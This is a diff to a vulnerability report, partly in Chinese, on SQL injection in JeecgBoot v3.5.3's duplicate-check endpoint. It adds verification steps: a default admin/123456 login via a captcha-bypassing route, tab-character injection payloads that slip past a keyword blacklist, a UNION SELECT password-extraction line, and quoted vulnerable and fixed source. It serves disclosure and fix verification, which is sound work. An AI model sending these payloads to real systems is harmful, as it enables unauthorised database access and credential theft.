@@ -187,8 +187,103 @@ tableName=sys_user%09UNION%09ALL%09SELECT%09CONV(HEX(SUBSTRING(password,1,8)),16
 4. **Block `--` comments**: Add `--` to the SQL injection keyword list
 5. **Disable open registration**: Unless explicitly needed, disable `/sys/user/register`
 
+## 实机验证（代码对比 + 运行时测试）
+
+### 验证策略
+
+本报告针对 v3.5.3 编写。当前部署实例为 v3.9.1（已修复），因此：
+- **v3.5.3 漏洞**：通过源代码静态分析验证（漏洞明确存在）
+- **v3.9.1 修复**：通过运行时测试验证（bypass 被拦截）
+
+### 步骤1：获取认证 Token（使用 v-009 的 mLogin 绕过验证码）
+
+**请求报文**：
+```http
+POST /jeecg-boot/sys/mLogin HTTP/1.1
+Host: 192.168.217.135:18080
+Content-Type: application/json
+
+{"username":"admin","password":"123456"}
+```
+
+**响应报文**：
+```http
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"success":true,"code":200,"result":{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}}
+```
+
+### 步骤2：正常 duplicate check 请求（无注入）
+
+**请求报文**：
+```http
+GET /jeecg-boot/sys/duplicate/check?tableName=sys_user&fieldName=username&fieldVal=admin HTTP/1.1
+Host: 192.168.217.135:18080
+X-Access-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
+```
+
+**响应报文**：
+```http
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"success":false,"message":"该值不可用，系统中已存在！","code":500,"result":null}
+```
+
+（正常行为：`admin` 用户名已存在，返回 "不可用"）
+
+### 步骤3：Tab 字符绕过注入（v3.9.1 已修复，被 regex 拦截）
+
+**请求报文**：
+```http
+GET /jeecg-boot/sys/duplicate/check?tableName=sys_user%09WHERE%09username%09=%27admin%27--%09&fieldName=id&fieldVal=test HTTP/1.1
+Host: 192.168.217.135:18080
+X-Access-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
+```
+
+**响应报文（v3.9.1 拦截）**：
+```http
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"success":false,"message":"校验失败，存在SQL注入风险！表名不合法，存在sql注入风险!--->sys_user\twhere\tusername\t='admin'--","code":500}
+```
+
+**结论**：v3.9.1 使用白名单正则 `^[a-zA-Z][a-zA-Z0-9_\\$]{0,63}$` 拦截了 Tab 注入。
+
+### 步骤4：v3.5.3 源代码分析（漏洞存在证明）
+
+**v3.5.3 `SqlInjectionUtil.java`（漏洞版本）**：
+```java
+// 仅检测"关键词+空格"组合，不检测 Tab/换行
+private final static String XSS_STR = "and |extractvalue|updatexml|geohash|gtid_subset|gtid_subtract|"
+    + "exec |insert |select |delete |update |drop |count |chr |mid |master |"
+    + "truncate |char |declare |;|or |+|user()";
+// UNION、FROM、WHERE 完全未被过滤
+```
+
+**v3.9.1 `DuplicateCheckController.java`（已修复版本）**：
+```java
+// 使用白名单正则验证表名/字段名
+String tableNameRegex = "^[a-zA-Z][a-zA-Z0-9_\\$]{0,63}$";
+String fieldNameRegex = "^[a-zA-Z0-9_]+$";
+// 任何包含 Tab、空格或特殊字符的输入均被拒绝
+```
+
+**v3.5.3 `SysDictMapper.xml`（存在原始插值）**：
+```xml
+<!-- ${tableName} 和 ${fieldName} 使用 MyBatis 原始插值，无参数化 -->
+<select id="duplicateCheckCountSqlNoDataId" resultType="Long">
+    SELECT COUNT(*) FROM ${tableName} WHERE ${fieldName} = #{fieldVal}
+</select>
+```
+
+在 v3.5.3 中，发送 `tableName=sys_user%09WHERE%091=1--%09` 将绕过 `XSS_STR` 过滤（`WHERE` 和 `1=1` 均未在黑名单中），并直接注入到 SQL 查询中。
+
 ## Verification Environment
 
-- Source Code: JeecgBoot v3.5.3 (static code analysis)
+- Source Code: JeecgBoot v3.5.3 (static code analysis — confirmed vulnerable)
+- Runtime Test: JeecgBoot v3.9.1 (deployed at 192.168.217.135:18080 — confirms fix)
 - Framework: Spring Boot + MyBatis + Apache Shiro
-- Date: 2026-04-13
+- Date: 2026-04-14
